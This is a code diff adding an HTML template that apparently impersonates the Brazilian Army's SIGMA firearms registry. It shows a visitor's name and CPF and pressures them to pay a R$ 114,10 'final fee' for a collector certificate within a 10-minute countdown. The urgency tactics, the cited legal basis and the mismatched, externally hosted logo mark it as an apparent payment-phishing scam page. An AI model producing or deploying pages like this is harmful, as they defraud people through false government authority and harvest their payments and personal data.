@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIGMA - Categoria Colecionador</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <div>
+                    <p class="text-black text-[10px] leading-tight">
+                        EXÉRCITO BRASILEIRO
+                    </p>
+                    <p class="text-black text-[10px] leading-tight font-bold">
+                        COMANDO LOGÍSTICO - COLOG
+                    </p>
+                    <p class="text-black text-[10px] leading-tight">
+                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <a href="{{ url_for('obrigado') }}" class="text-white hover:text-gray-200 mr-4">
+                <i class="fas fa-arrow-left"></i>
+            </a>
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">CATEGORIA COLECIONADOR</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-4xl mx-auto">
+            <!-- User Info -->
+            <div class="bg-white rounded-lg shadow-md p-6 mb-8">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="border rounded-lg p-3">
+                        <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
+                        <p class="text-gray-900 font-bold">{{ user_data.name }}</p>
+                    </div>
+                    <div class="border rounded-lg p-3">
+                        <label class="block text-sm font-medium text-gray-600">CPF</label>
+                        <p class="text-gray-900 font-bold">{{ '{}.{}.{}-{}'.format(user_data.cpf[:3], user_data.cpf[3:6], user_data.cpf[6:9], user_data.cpf[9:]) }}</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Category Details -->
+            <div class="bg-white rounded-lg shadow-md p-6 mb-8">
+                <div class="flex items-center mb-6">
+                    <i class="fas fa-archive text-4xl text-custom-blue mr-4"></i>
+                    <div>
+                        <h2 class="text-2xl font-bold text-gray-800">Categoria Colecionador</h2>
+                        <p class="text-gray-600">Preservação do patrimônio histórico através de coleções</p>
+                    </div>
+                </div>
+
+                <div class="space-y-6">
+                    <div class="border-l-4 border-green-500 pl-4">
+                        <h3 class="font-bold text-lg mb-2">Requisitos Cumpridos:</h3>
+                        <ul class="space-y-2 text-gray-700">
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-green-500 mr-2"></i>
+                                Idade mínima de 25 anos
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-green-500 mr-2"></i>
+                                Certidão de antecedentes criminais
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-green-500 mr-2"></i>
+                                Comprovante de residência
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-green-500 mr-2"></i>
+                                Avaliação psicológica
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-green-500 mr-2"></i>
+                                Local adequado para guarda do acervo
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Taxa Box -->
+                    <div class="bg-gray-100 rounded-lg p-6 mt-6">
+                        <div class="mb-4">
+                            <div class="flex items-start">
+                                <div class="mr-3">
+                                    <i class="fas fa-exclamation-circle text-red-600 text-xl animate-pulse"></i>
+                                </div>
+                                <div>
+                                    <h3 class="font-bold text-lg text-red-800">REQUISITO PENDENTE:</h3>
+                                    <p class="text-sm text-red-700 mb-2">Esta é a última taxa necessária para receber seu Certificado CAC. O pagamento deve ser realizado em até <span id="countdown" class="font-bold">10:00</span> minutos.</p>
+                                </div>
+                            </div>
+                            <div class="mt-4">
+                                <h4 class="font-semibold mb-2">Registro de Acervo de Colecionador</h4>
+                                <p class="text-gray-700 mb-4">
+                                    Em conformidade com a Lei Federal nº 14.589/2024, Art. 27, o Registro de Acervo é essencial para a preservação do patrimônio histórico. Esta taxa custeia:
+                                </p>
+                                <ul class="list-disc list-inside space-y-2 text-gray-700 mb-4">
+                                    <li>Cadastro e documentação do acervo</li>
+                                    <li>Sistema de registro e autenticação</li>
+                                    <li>Preservação da memória histórica</li>
+                                </ul>
+                                <div class="flex justify-between items-center bg-white p-4 rounded-lg">
+                                    <div>
+                                        <p class="font-medium">Valor da Taxa:</p>
+                                        <p class="text-sm text-gray-600">Validade de 1 ano</p>
+                                    </div>
+                                    <p class="font-bold text-lg">R$ 114,10</p>
+                                </div>
+                            </div>
+                        </div>
+                        <form action="{{ url_for('pagamento_categoria') }}" method="POST" class="mt-6" onsubmit="showLoading(document.getElementById('submit-button'))">
+                            <input type="hidden" name="categoria" value="colecionador">
+                            <button id="submit-button" type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded transition-colors flex items-center justify-center group">
+                                <span class="button-text">Pagar Taxa e Finalizar</span>
+                                <i class="fas fa-check ml-2 button-icon"></i>
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-custom-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
+    </div>
+
+    <script>
+        function startCountdown() {
+            var timeLeft = 600; // 10 minutes in seconds
+            var countdownElement = document.getElementById('countdown');
+
+            var countdownInterval = setInterval(function() {
+                var minutes = Math.floor(timeLeft / 60);
+                var seconds = timeLeft % 60;
+
+                countdownElement.textContent = minutes.toString().padStart(2, '0') + ':' + 
+                                           seconds.toString().padStart(2, '0');
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = '/';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        window.onload = startCountdown;
+
+        function showLoading(button) {
+            const buttonText = button.querySelector('.button-text');
+            const buttonIcon = button.querySelector('.button-icon');
+
+            button.disabled = true;
+            buttonText.textContent = 'Processando pagamento...';
+            buttonIcon.classList.remove('fa-check');
+            buttonIcon.classList.add('fa-circle-notch', 'fa-spin');
+        }
+    </script>
+</body>
+</html>
